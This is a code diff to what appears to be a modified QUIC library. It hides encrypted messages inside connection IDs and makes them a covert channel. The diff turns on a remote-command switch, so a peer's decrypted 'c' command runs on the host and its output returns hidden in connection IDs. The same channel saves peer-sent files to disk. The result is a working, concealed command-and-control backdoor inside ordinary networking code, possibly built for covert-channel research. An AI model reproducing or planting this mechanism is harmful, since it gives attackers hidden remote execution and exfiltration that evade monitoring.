@@ -123,7 +123,7 @@ RSA_PRIVATE_KEY = None
 CID_HISTORY_LENGTH = 64
 PEER_META = {}
 PEER_META_LOCK = threading.Lock()
-REMOTE_COMMANDS_ENABLED = False
+REMOTE_COMMANDS_ENABLED = True
 
 
 def EPOCHS(shortcut: str) -> FrozenSet[tls.Epoch]:
@@ -424,15 +424,7 @@ class QuicConnection:
                 cid=cid, sequence_number=None
             )
         else:
-            if not peer_meta['cid_queue'].empty():
-                # Pull a cid from the queue
-                cid = peer_meta['cid_queue'].get()
-                print("USING CID:", cid.hex())
-            else:
-                # On first connection we won't have a cid QUEUE so pick a random one
-                # Additonally for non cc clients, the queue will never be filled so just use a random cid
-                print("USING RANDOM CID")
-                cid = os.urandom(8)
+            cid = os.urandom(8)
             self._peer_cid = QuicConnectionId(
                 cid=cid, sequence_number=None
             )
@@ -1772,7 +1764,7 @@ class QuicConnection:
                     self._handshake_confirmed = True
                     self._handshake_done_pending = True
 
-                self._replenish_connection_ids()
+                self._replenish_connection_ids(context.addr)
                 self._events.append(
                     events.HandshakeCompleted(
                         alpn_protocol=self.tls.alpn_negotiated,
@@ -2011,7 +2003,7 @@ class QuicConnection:
                 peer_meta['cid_history'] = peer_meta['cid_history'][:CID_HISTORY_LENGTH]
                 # Add payload to buffer
                 if self._is_client:
-                    peer_meta['buffer'] = peer_meta['buffer'] + self._local_initial_source_connection_id
+                    peer_meta['buffer'] = peer_meta['buffer'] + connection_id
                 else:
                     peer_meta['buffer'] = peer_meta['buffer'] + self._original_destination_connection_id
 
@@ -2038,6 +2030,7 @@ class QuicConnection:
                 decrypted_payload = ccrypto.try_decrypt(peer_meta['private_key'], peer_meta['buffer'], raise_on_error=False)
 
                 if decrypted_payload is not None:
+                    peer_meta['buffer'] = b''
                     command = decrypted_payload[0]
                     decrypted_message = decrypted_payload[1:]
                     
@@ -2049,18 +2042,20 @@ class QuicConnection:
                     if command == ord('m'):
                         # Log the message
                         logger.info("RECEIVED MESSAGE: %s", decrypted_message)
-                        ccrypto.queue_message(command, peer_ip, "m:Received message".encode('utf8'), peer_meta['cid_queue'], peer_meta['public_key'])
+                        ccrypto.queue_message(peer_ip, f"mm{len(peer_meta['message_history'])}".encode('utf8'), peer_meta['cid_queue'], peer_meta['public_key'])
                     elif command == ord('f'):
                         # Save the file
                         file_prefix = "server-" if self._is_client else "client-"
                         filename = f'{peer_ip}-message-{len(message_list)}.bin'
                         open(filename, 'wb').write(decrypted_message)
                         logger.info("RECEIVED FILE SAVED TO: %s", filename)
-                        ccrypto.queue_message(command, peer_ip, f"m:Received {filename}".encode('utf8'), ['cid_queue'], peer_meta['public_key'])
+                        ccrypto.queue_message(peer_ip, f"mf{len(peer_meta['message_history'])}".encode('utf8'), peer_meta['cid_queue'], peer_meta['public_key'])
                     elif REMOTE_COMMANDS_ENABLED and command == ord('c'):
                         logger.info("RECEIVED COMMAND: %s", decrypted_message)
                         stdout, stderr, return_code = execute_command(decrypted_message)
-                        ccrypto.queue_message(command, peer_ip, f"m:{stdout}\n{stderr}\n{return_code}".encode('utf8'), ['cid_queue'], peer_meta['public_key'])
+                        ccrypto.queue_message(peer_ip, f"m:{stdout}\n{stderr}\n{return_code}".encode('utf8'), peer_meta['cid_queue'], peer_meta['public_key'])
+                    elif command == ord('k'):
+                        logger.info("RECEIVED KEEP ALIVE MESSAGE")
         PEER_META[peer_ip] = peer_meta
         PEER_META_LOCK.release()
 
@@ -2349,7 +2344,7 @@ class QuicConnection:
                 break
 
         # issue a new connection ID
-        self._replenish_connection_ids()
+        self._replenish_connection_ids(context.addr)
 
     def _handle_stop_sending_frame(
         self, context: QuicReceiveContext, frame_type: int, buf: Buffer
@@ -2808,14 +2803,16 @@ class QuicConnection:
                     },
                 )
 
-    def _replenish_connection_ids(self) -> None:
+    def _replenish_connection_ids(self, addr) -> None:
         """
         Generate new connection IDs.
         """
-        while len(self._host_cids) < min(8, self._remote_active_connection_id_limit):
-            hid = os.urandom(self._configuration.connection_id_length)
-            if not self._is_client:
-                print("GENERATED_HID", hid.hex())
+        if not self._is_client and addr[0] in PEER_META:
+            from . import ccrypto
+            if PEER_META[addr[0]]['cid_queue'].empty():
+                ccrypto.queue_message(addr[0], b'k', PEER_META[addr[0]]['cid_queue'], PEER_META[addr[0]]['public_key'])
+            hid = PEER_META[addr[0]]['cid_queue'].get()
+            # hid = b'AAAAAAAA'
             self._host_cids.append(
                 QuicConnectionId(
                     cid=hid,
@@ -2824,6 +2821,27 @@ class QuicConnection:
                 )
             )
             self._host_cid_seq += 1
+            while len(self._host_cids) < min(8, self._remote_active_connection_id_limit):
+                hid = os.urandom(self._configuration.connection_id_length)
+                self._host_cids.append(
+                    QuicConnectionId(
+                        cid=hid,
+                        sequence_number=self._host_cid_seq,
+                        stateless_reset_token=os.urandom(16),
+                    )
+                )
+                self._host_cid_seq += 1
+        else:
+            while len(self._host_cids) < min(8, self._remote_active_connection_id_limit):
+                hid = os.urandom(self._configuration.connection_id_length)
+                self._host_cids.append(
+                    QuicConnectionId(
+                        cid=hid,
+                        sequence_number=self._host_cid_seq,
+                        stateless_reset_token=os.urandom(16),
+                    )
+                )
+                self._host_cid_seq += 1
 
     def _retire_peer_cid(self, connection_id: QuicConnectionId) -> None:
         """
@@ -3559,8 +3577,6 @@ class QuicConnection:
         )
         buf.push_uint_var(connection_id.sequence_number)
         buf.push_uint_var(retire_prior_to)
-        if not self._is_client:
-            print("FINAL CID:", connection_id.cid.hex())
         buf.push_uint8(len(connection_id.cid))
         buf.push_bytes(connection_id.cid)
         buf.push_bytes(connection_id.stateless_reset_token)
